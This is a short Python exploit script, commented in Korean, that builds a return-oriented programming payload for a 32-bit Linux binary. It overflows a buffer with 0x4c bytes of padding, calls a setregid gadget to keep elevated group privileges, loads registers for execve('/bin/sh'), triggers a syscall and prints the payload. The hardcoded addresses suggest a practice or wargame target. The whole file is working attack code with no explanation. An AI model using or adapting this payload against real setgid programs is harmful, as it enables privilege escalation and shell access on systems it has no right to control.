#!/usr/bin/env python3
import sys
from struct import pack

# -------------------------
# 설정값
# -------------------------
OFFSET = 0x4c

DO_SETREGID  = 0x080491d1
POP_EAX_RET  = 0x080491b3
POP_EBX_RET  = 0x080491b5
POP_ECX_RET  = 0x080491b7
POP_EDX_RET  = 0x080491b9
SYSCALL      = 0x080491cb
BINSH        = 0x0804c008

SYS_EXECVE = 0xb

# -------------------------
# payload 구성
# -------------------------
payload  = b"A" * OFFSET

# setregid(getegid(), getegid())
payload += pack("<I", DO_SETREGID)

# eax = 11 (execve)
payload += pack("<I", POP_EAX_RET)
payload += pack("<I", SYS_EXECVE)

# ebx = "/bin/sh"
payload += pack("<I", POP_EBX_RET)
payload += pack("<I", BINSH)

# ecx = NULL
payload += pack("<I", POP_ECX_RET)
payload += pack("<I", 0x0)

# edx = NULL
payload += pack("<I", POP_EDX_RET)
payload += pack("<I", 0x0)

# int 0x80
payload += pack("<I", SYSCALL)

# -------------------------
# stdout으로 출력
# -------------------------
sys.stdout.buffer.write(payload)
